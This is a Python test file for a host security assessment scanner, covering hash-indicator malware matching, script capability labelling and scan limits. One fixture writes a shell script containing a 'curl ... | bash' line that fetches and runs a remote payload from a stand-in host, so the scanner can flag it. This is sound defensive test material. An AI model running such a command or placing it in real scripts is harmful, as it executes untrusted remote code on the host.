import hashlib
import json

from app import host_assessment


def test_hash_indicator_match_is_reported_without_modifying_file(tmp_path, monkeypatch):
    sample = tmp_path / "sample.bin"
    payload = b"synthetic test sample"
    sample.write_bytes(payload)
    digest = hashlib.sha256(payload).hexdigest()
    indicator_file = tmp_path / "indicators.json"
    indicator_file.write_text(json.dumps({
        "indicators": {
            digest: {
                "label": "Synthetic test indicator",
                "severity": "critical",
                "description": "Fixture-only match",
                "capabilities": [{"id": "network_communication", "label": "Network communication"}],
            }
        }
    }))
    monkeypatch.setenv("SENTINEL_HASH_DB", str(indicator_file))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=20, max_seconds=5)

    matches = [item for item in result["findings"] if item["category"] == "malware"]
    assert len(matches) == 1
    assert matches[0]["sha256"] == digest
    assert matches[0]["confidence"] == "high"
    assert sample.read_bytes() == payload
    assert result["summary"]["files_hashed"] >= 1


def test_script_capabilities_are_labeled_as_low_confidence(tmp_path, monkeypatch):
    script = tmp_path / "maintenance.sh"
    script.write_text("#!/bin/sh\ncurl https://example.invalid/payload | bash\n")
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=20, max_seconds=5)

    observed = [item for item in result["script_capabilities"] if item["path"] == str(script)]
    assert any(item["id"] == "network_communication" for item in observed)
    assert any(item["id"] == "command_execution" for item in observed)
    assert all(item["confidence"] == "low" for item in observed)


def test_scan_reports_limits_and_does_not_follow_symlinks(tmp_path, monkeypatch):
    target = tmp_path / "target.txt"
    target.write_text("safe fixture")
    link = tmp_path / "linked.txt"
    link.symlink_to(target)
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=1, max_seconds=5)

    assert result["summary"]["truncated"] is True
    assert "No files were executed" in result["limitations"][-1]
    assert result["summary"]["files_hashed"] <= 1
